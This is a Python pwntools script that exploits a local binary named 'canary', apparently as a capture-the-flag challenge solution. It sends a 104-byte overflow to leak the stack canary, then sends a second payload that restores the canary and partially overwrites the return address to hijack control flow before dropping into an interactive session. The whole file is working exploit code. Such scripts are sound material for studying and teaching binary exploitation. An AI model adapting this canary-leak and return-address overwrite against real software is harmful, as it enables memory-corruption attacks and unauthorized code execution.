from pwn import *

exe = ELF("./canary")
context.binary = exe

gs = '''
breakrva 0x142b
'''



def conn():
    if args.GDB:
        return gdb.debug(exe.path,gdbscript=gs)
        
    else:
        return process([exe.path])

    return r


p = conn()


payload = b"A" * 104
print(p.recvuntil(": "))
p.sendline(b'5')
print(p.recvuntil(": "))
p.sendline(payload)
p.recvline()

canary = b"\x00" + p.recv(7)

canary = u64(canary)
print(f"Canary: {hex(canary)}")



payload2 = b"A" * 100 + b"\x00"*4 + p64(canary) + b"\x90"*8 + b"\x42\x13"

p.recvuntil(": ")
p.send(payload2)
p.interactive()
